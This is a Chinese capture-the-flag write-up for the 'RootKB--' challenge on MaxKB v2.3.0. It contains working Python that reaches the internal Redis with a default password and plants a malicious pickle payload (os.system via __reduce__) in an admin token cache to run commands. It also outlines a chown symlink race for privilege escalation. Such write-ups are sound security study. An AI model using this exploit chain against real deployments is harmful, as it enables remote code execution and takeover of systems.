# RootKB--

## 题目简述

`RootKB--` 将环境回退到 MaxKB v2.3.0。后台仍允许创建并执行 Python 工具，而内部 PostgreSQL、Redis 等服务沿用镜像默认配置。Nu1L 的实际解法利用沙箱能够访问 Redis、Redis 使用默认口令，以及应用会对 token 缓存值执行不受限的 pickle 反序列化，最终让主应用进程执行命令读取 `/root/flag`。

官方题解还给出了一条预期方向：工具代码先写入临时 Python 文件，再由高权限逻辑执行 `chown sandbox_user:root <file>`；`chown` 默认跟随符号链接，因此可以通过竞争条件改变任意目标文件的属主，再借 `/etc/passwd` 等文件完成提权。比赛解法没有依赖这条竞态。

## 解题过程

### 进入内部 Redis

先在“创建工具”处执行最小探测。v2.3.0 的沙箱没有 v2.3.1 中的网络限制，可以访问同一部署内的 Redis；题目镜像保留了默认口令 `Password123@redis`。不要把 PDF 中的完整临时 token key 写死，应该先枚举并识别当前管理员会话对应的 key：

```python
import redis

r = redis.Redis(
    host="localhost",
    port=6379,
    password="Password123@redis",
    decode_responses=False,
)

keys = list(r.scan_iter(match="*TOKEN*"))
result = b"\n".join(keys).decode(errors="replace")
```

### 构造反序列化对象

目标 token 值由应用按 pickle 格式读取，反序列化路径没有限制可加载的全局对象。可利用 `__reduce__` 返回一个命令执行函数，把 flag 写到沙箱后续能够读取的位置：

```python
import os
import pickle
import redis

class Payload:
    def __reduce__(self):
        command = "cat /root/flag > /tmp/flag && chmod 644 /tmp/flag"
        return os.system, (command,)

r = redis.Redis(
    host="localhost",
    port=6379,
    password="Password123@redis",
    decode_responses=False,
)

target_key = b"<上一步确认的管理员 TOKEN key>"
r.set(target_key, pickle.dumps(Payload(), protocol=4))
result = "payload written"
```

带着对应管理员 cookie 再访问会读取该 token 的页面，主应用反序列化缓存值并执行命令。最后重新运行一个普通工具读取 `/tmp/flag`，比赛环境验证得到 `RCTF{old_vuln_deleted___new_vuln_says_hi!}`。

这条链的关键不是 Celery 本身，而是“低权限工具可达内部 Redis”与“高权限应用信任 Redis 中的 pickle 数据”两个边界同时失守。原 PDF 把 `RootKB` 的 `sandbox.so` 代码和本题 Redis 代码排版到相邻位置，不能把两条利用链混为一谈。

### 预期竞态的机制

在另一条路线中，攻击者要在“写临时脚本”和 `chown` 之间把文件替换为符号链接。GNU `chown` 默认解引用命令行参数指向的符号链接并修改其目标；若竞态命中，就能让沙箱用户取得敏感文件写权限。这个外部文档中的必要结论已写入正文，原始说明可见 [GNU coreutils 的 chown 文档](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)。

## 方法总结

- 核心技巧：从受限工具横向访问内部 Redis，再用恶意 pickle 污染高权限应用会读取的 token 缓存。
- 识别信号：沙箱能访问内网服务、镜像保留默认凭据、缓存数据使用 pickle 且没有安全反序列化边界。
- 复用要点：先用只读枚举确认真实 key 和消费方，再写最小 payload；同时检查高权限文件操作是否存在符号链接跟随和 TOCTOU 竞态。
